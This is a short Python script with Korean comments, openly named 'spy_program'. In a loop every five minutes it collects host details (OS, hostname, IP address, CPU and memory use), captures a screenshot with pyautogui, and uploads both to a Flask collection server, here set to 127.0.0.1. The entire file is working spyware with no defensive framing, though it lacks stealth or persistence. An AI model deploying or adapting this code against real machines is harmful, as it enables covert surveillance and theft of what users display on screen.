import os
import platform
import psutil
import socket
import requests
import pyautogui
import time
from datetime import datetime

# 서버에 정보를 전송하는 함수
def send_data_to_server(data, screenshot_path=None):
    url = 'http://127.0.0.1:5000/upload'  # Flask 서버 주소
    
    # 데이터 전송
    try:
        response = requests.post(url, data=data)
        print("Data sent to server:", response.status_code)
        
        if screenshot_path:
            with open(screenshot_path, 'rb') as img_file:
                files = {'file': img_file}
                screenshot_response = requests.post(url, files=files)
                print("Screenshot sent:", screenshot_response.status_code)
    except Exception as e:
        print(f"Failed to send data: {e}")

# 시스템 정보 수집 함수
def collect_system_info():
    system_info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Platform": platform.platform(),
        "Processor": platform.processor(),
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "CPU Usage": psutil.cpu_percent(interval=1),
        "Memory Usage": psutil.virtual_memory().percent,
    }
    
    return system_info

# 스크린샷 캡처 함수
def capture_screenshot():
    screenshot_filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    screenshot_path = os.path.join(os.getcwd(), screenshot_filename)
    
    pyautogui.screenshot(screenshot_path)
    
    return screenshot_path

# 주기적으로 시스템 정보를 수집하고 스크린샷을 전송하는 함수
def spy_program(interval=60):
    while True:
        # 시스템 정보 수집
        system_info = collect_system_info()
        print("Collected System Info:", system_info)
        
        # 스크린샷 캡처
        screenshot_path = capture_screenshot()
        print(f"Screenshot saved at {screenshot_path}")
        
        # 서버로 전송
        send_data_to_server(system_info, screenshot_path=screenshot_path)
        
        # 지정된 시간만큼 대기 (초 단위)
        time.sleep(interval)

if __name__ == "__main__":
    spy_program(interval=300)  # 5분 간격으로 시스템 정보 수집 및 전송
